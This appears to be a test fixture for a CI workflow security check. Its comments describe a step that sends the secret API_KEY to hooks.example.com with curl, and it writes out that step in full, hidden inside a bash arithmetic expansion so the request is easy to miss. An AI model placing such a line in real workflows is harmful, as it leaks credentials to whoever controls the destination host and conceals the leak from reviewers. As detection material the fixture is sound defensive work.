# situation: on push, a step sends the secret API_KEY to hooks.example.com
#   with curl, in a $( ) inside $(( )).
# reason: bash expands the $( ) inside $(( )) before it evaluates the
#   expression, so curl runs and the request carries the secret to the host.
# attack: the attacker takes over the server of the destination, by a breach
#   of the vendor or by registering the domain when the domain lapses.
# attack-run-behavior: curl sends the secret to hooks.example.com, whose
#   server, now the attacker's, logs the secret.
on: workflow_call
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - env:
          API_KEY: ${{ secrets.API_KEY }}
        run: |
          echo $(( $(curl -fsS -o /dev/null -w 0 -H "x-apikey: $API_KEY" https://hooks.example.com/) ))
